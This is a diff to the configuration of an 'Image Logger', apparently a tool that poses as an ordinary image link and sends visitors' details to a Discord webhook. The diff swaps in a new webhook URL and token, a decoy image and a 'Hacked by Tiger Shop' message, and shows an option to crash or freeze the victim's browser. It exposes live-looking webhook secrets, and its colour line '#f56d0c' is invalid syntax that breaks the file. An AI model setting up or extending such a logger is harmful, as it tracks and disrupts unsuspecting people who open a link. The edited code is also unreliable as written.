@@ -12,14 +12,14 @@ __author__ = "Leon"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1342558969436311572/b_Sg5oUwb2I2iGbqRblyfpB5gj0c0iclrsRJQR1aNkTb4woX-fTEDaBrjS7e70bGN8FH",
-    "image": "https://upload.wikimedia.org/wikipedia/de/archive/4/42/20051210233026%21Leeres_Bild_mit_weiss.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1357837803714641940/LLABdKKGySi7tuapUuuFL3hZK2Hv4l0KYtsIloc7xBfk8BKsJ8lAbbY9-L2FGTdWsEDd",
+    "image": "https://shop.renolit.com/out/pictures/master/product/1/Grau_7155_Glatt-2_Grey_7155_Smooth-2_02.11.71.000047---809700_OS.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger By Tiger Shop", # Set this to the name you want the webhook to have
+    "color": #f56d0c, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
@@ -28,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been Hacked by RNG XDDD", # Message to show
+        "message": "This browser has been Hacked by Tiger Shop XDDD", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
